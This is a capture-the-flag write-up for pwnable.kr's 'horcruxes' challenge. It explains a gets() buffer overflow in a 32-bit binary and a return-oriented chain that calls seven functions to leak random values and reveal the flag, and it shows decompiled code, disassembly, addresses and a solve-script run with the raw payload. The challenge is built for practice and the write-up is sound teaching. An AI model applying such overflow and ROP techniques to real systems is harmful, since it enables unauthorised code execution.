# pwnable.kr -- Toddler's Bottle -- horcruxes

## 1. Challenge

```
Voldemort concealed his splitted soul inside 7 horcruxes.
Find all horcruxes, and ROP it!
author: jiwon choi

ssh horcruxes@pwnable.kr -p2222 (pw:guest)
```

## 2. Solution

Log in via SSH and you will see two files: `horcruxes` and `readme`. `readme` is a text file and it says:

```
horcruxes@ubuntu:~$ cat readme
connect to port 9032 (nc 0 9032). the 'horcruxes' binary will be executed under horcruxes_pwn privilege.
rop it to read the flag.

horcruxes@ubuntu:~$
```

Fine. Let's download `horcruxes` and drop it into IDA. You can find that there are 7 random integers, `a`, `b`, `c`, ... `g`, generated and `sum` is set to the sum of these 7 integers in function `init_ABCDEFG()`. Because the seed of function `rand()` is set by 4 bytes read from `/dev/urandom`, we cannot hack it.

Now let's go to see function `ropme()`. 

```c
int ropme() {
  char s[100]; // [esp+4h] [ebp-74h]
  int v2; // [esp+68h] [ebp-10h]
  int fd; // [esp+6Ch] [ebp-Ch]

  printf("Select Menu:");
  __isoc99_scanf("%d", &v2);
  getchar();
  if ( v2 == a ) {
    A();
  }
  else if ( v2 == b ) {
    B();
  }
  else if ( v2 == c ) {
    C();
  }
  else if ( v2 == d ) {
    D();
  }
  else if ( v2 == e ) {
    E();
  }
  else if ( v2 == f ) {
    F();
  }
  else if ( v2 == g ) {
    G();
  } else {
    printf("How many EXP did you earned? : ");
    gets(s);
    if ( atoi(s) == sum )
    {
      fd = open("flag", 0);
      s[read(fd, s, 0x64u)] = 0;
      puts(s);
      close(fd);
      exit(0);
    }
    puts("You'd better get more experience to kill Voldemort");
  }
  return 0;
}
```

Apparently, function `gets()` is called which means that we can make a buffer overflow and overwrite return address. However, there are something we sould take care of:

1. Naturally we want to set return address to `0x080A010B` which is the start of `fd = open("flag", 0);`. But `0x080A010B` has a bad char `0x0A`, also `\n`, which will stop function `gets()` reading from stdin. So we cannot set return address to `0x080A010B`.

2. The code block we want to execute has the following assembly code:

   ```asm
   .text:080A010B                 sub     esp, 8
   .text:080A010E                 push    0               ; oflag
   .text:080A0110                 push    offset file     ; "flag"
   .text:080A0115                 call    _open
   .text:080A011A                 add     esp, 10h
   .text:080A011D                 mov     [ebp+fd], eax
   .text:080A0120                 sub     esp, 4
   .text:080A0123                 push    64h             ; nbytes
   .text:080A0125                 lea     eax, [ebp+s]
   .text:080A0128                 push    eax             ; buf
   .text:080A0129                 push    [ebp+fd]        ; fd
   .text:080A012C                 call    _read
   .text:080A0131                 add     esp, 10h
   .text:080A0134                 mov     [ebp+eax+s], 0
   .text:080A0139                 sub     esp, 0Ch
   .text:080A013C                 lea     eax, [ebp+s]
   .text:080A013F                 push    eax             ; s
   .text:080A0140                 call    _puts
   .text:080A0145                 add     esp, 10h
   .text:080A0148                 sub     esp, 0Ch
   .text:080A014B                 push    [ebp+fd]        ; fd
   .text:080A014E                 call    _close
   .text:080A0153                 add     esp, 10h
   .text:080A0156                 sub     esp, 0Ch
   .text:080A0159                 push    0               ; status
   .text:080A015B                 call    _exit
   ```

   Obviously we cannot set `ebp` whatever we want which will be affect during buffer overflow. Otherwise an access violation would occur.

I though it would be a hard challenge. But I found that all of function `A()`, `B()`, ... `G()` are located on addresses that have no bad char `\n`:

```
func_A_addr = 0x0809FE4B
func_B_addr = 0x0809FE6A
func_C_addr = 0x0809FE89
func_D_addr = 0x0809FEA8
func_E_addr = 0x0809FEC7
func_F_addr = 0x0809FEE6
func_G_addr = 0x0809FF05
```

So we can execute these functions one by one and get the values of `a`, `b`, `c`, `d`, `e`, `f` and `g`. After that, execute `ropme()` again and input the right sum to get flag.

```
horcruxes@ubuntu:/tmp/solve2$ python2 ./solve.py 
[+] Opening connection to localhost on port 9032: Done
Voldemort concealed his splitted soul inside 7 horcruxes.
Find all horcruxes, and destroy it!

Select Menu: 1
How many EXP did you earned? :  00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\x00aaaK\xfe   j\xfe   \x89\xfe   \xa8\xfe   ��   ��  \x05\xff   ��   
You'd better get more experience to kill Voldemort
You found "Tom Riddle's Diary" (EXP +15452973)
You found "Marvolo Gaunt's Ring" (EXP +-1153331378)
You found "Helga Hufflepuff's Cup" (EXP +-1491435822)
You found "Salazar Slytherin's Locket" (EXP +129335114)
You found "Rowena Ravenclaw's Diadem" (EXP +-1692814741)
You found "Nagini the Snake" (EXP +-1940301612)
You found "Harry Potter" (EXP +94303011)

Select Menu: 1
How many EXP did you earned? :  -1743825159
xxxxxxxxxxxxxxxxxxxxxxxxxxxx!

[*] Closed connection to localhost port 9032
```
